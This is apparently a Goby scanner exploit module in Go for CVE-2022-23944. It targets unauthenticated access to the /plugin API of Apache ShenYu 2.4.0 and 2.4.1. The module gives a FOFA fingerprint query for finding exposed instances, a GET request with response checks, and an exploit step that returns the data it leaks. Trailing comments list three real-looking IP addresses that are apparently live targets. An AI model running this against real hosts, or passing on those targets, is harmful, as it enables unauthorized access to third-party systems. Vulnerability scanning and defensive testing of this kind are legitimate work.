package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Apache ShenYu Admin plugin API Unauth Access Vulnerability (CVE-2022-23944)",
    "Description": "<p>Apache ShenYu is an asynchronous, high-performance, cross-language, reactive API gateway of the Apache Foundation.</p><p>Apache ShenYu 2.4.0 and 2.4.1 have an access control error vulnerability that stems from users accessing the /plugin api without authentication.</p>",
    "Product": "Apache ShenYu",
    "Homepage": "https://github.com/apache/incubator-shenyu/",
    "DisclosureDate": "2022-04-02",
    "Author": "abszse",
    "FofaQuery": "body=\"id=\\\"httpPath\\\" style=\\\"display: none\"",
    "GobyQuery": "body=\"id=\\\"httpPath\\\" style=\\\"display: none\"",
    "Level": "3",
    "Impact": "<p>Apache ShenYu 2.4.0 and 2.4.1 have an access control error vulnerability that stems from users accessing the /plugin api without authentication.</p>",
    "Recommendation": "<p>Restrict access to /plugin.</p><p>Follow the official website update in time: <a href=\"https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y\">https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y</a></p>",
    "References": [
        "https://github.com/cckuailong/reapoc/blob/main/2022/CVE-2022-23944/vultarget/README.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/plugin",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"message\":\"query",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success\",",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/plugin",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2022-23944"
    ],
    "CNNVD": [
        "CNNVD-202201-2308"
    ],
    "CNVD": [
        "CNVD-2022-14708"
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "Apache ShenYu Admin plugin 接口未授权访问漏洞（CVE-2022-23944）",
            "Product": "Apache ShenYu",
            "Description": "<p>Apache ShenYu是美国阿帕奇（Apache）基金会的一个异步的，高性能的，跨语言的，响应式的 API 网关。<br></p><p>Apache ShenYu 2.4.0 和 2.4.1存在访问控制错误漏洞，该漏洞源于用户无需身份验证即可访问 /plugin api。<br></p>",
            "Recommendation": "<p>对/plugin 进行访问限制。</p><p>及时关注官网更新：<a href=\"https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y\">https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y</a></p>",
            "Impact": "<p>Apache ShenYu 2.4.0 和 2.4.1存在访问控制错误漏洞，该漏洞源于用户无需身份验证即可访问 /plugin api。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Apache ShenYu Admin plugin API Unauth Access Vulnerability (CVE-2022-23944)",
            "Product": "Apache ShenYu",
            "Description": "<p>Apache ShenYu is an asynchronous, high-performance, cross-language, reactive API gateway of the Apache Foundation.<br></p><p>Apache ShenYu 2.4.0 and 2.4.1 have an access control error vulnerability that stems from users accessing the /plugin api without authentication.<br></p>",
            "Recommendation": "<p>Restrict access to /plugin.</p><p>Follow the official website update in time: <a href=\"https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y\">https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y</a></p>",
            "Impact": "<p>Apache ShenYu 2.4.0 and 2.4.1 have an access control error vulnerability that stems from users accessing the /plugin api without authentication.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}
//https://47.114.40.129
//http://116.196.103.132:8082
//http://150.158.216.42